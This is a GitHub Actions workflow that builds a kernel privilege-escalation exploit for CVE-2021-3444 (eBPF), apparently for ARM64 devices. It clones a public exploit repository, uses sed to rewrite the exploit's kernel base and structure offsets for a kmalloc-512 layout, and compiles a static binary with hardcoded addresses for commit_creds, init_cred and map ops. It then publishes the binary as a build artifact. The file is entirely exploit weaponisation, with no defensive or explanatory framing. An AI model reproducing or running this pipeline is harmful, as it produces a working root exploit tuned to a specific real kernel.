name: build_ebpf_lpe_kmalloc512
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update -y
          sudo apt-get install -y gcc make git

      - name: Clone and patch exploit for kmalloc-512
        run: |
          git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
          
          echo "=== Before patch ==="
          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c
          
          # Patch for ARM64 kmalloc-512 layout
          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
          sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 320|' exploit.c
          sed -i 's|#define MAP_VALUE_SIZE 256|#define MAP_VALUE_SIZE 128|' exploit.c
          sed -i 's|#define OUTER_MAX_ENTRIES 32|#define OUTER_MAX_ENTRIES 16|' exploit.c
          sed -i 's|#define OPS_OFFSET 304|#define OPS_OFFSET 192|' exploit.c
          
          echo "=== After patch ==="
          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c

      - name: Compile
        run: |
          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
          gcc -static -O2 -I ../../../common/include \
            -DDYN_ARRAY_MAP_OPS=0xffffff8008f5d500ULL \
            -DDYN_ARRAY_OF_MAPS_MAP_OPS=0xffffff8008f5d780ULL \
            -DDYN_FD_ARRAY_MAP_DELETE_ELEM=0xffffff80081d6cecULL \
            -DDYN_COMMIT_CREDS=0xffffff80080e03dcULL \
            -DDYN_INIT_CRED=0xffffff8009787f48ULL \
            exploit.c -o exploit
          
          file exploit
          ls -la exploit

      - uses: actions/upload-artifact@v4
        with:
          name: ebpf-lpe-512
          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit
